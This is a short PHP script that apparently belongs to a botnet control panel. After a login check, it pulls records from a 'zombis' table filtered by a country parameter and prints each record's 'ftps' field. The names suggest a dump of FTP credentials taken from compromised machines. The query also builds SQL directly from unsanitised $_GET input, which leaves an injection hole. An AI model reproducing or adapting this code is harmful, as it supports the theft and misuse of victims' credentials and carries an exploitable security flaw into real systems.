<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php
require_once('../../includes.php'); 

$Emaillist = $DB->Select("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'");
for($i=0; $i<count($Emaillist); $i++){

echo str_replace("," , "" , $Emaillist[$i]['ftps']);




}


?>
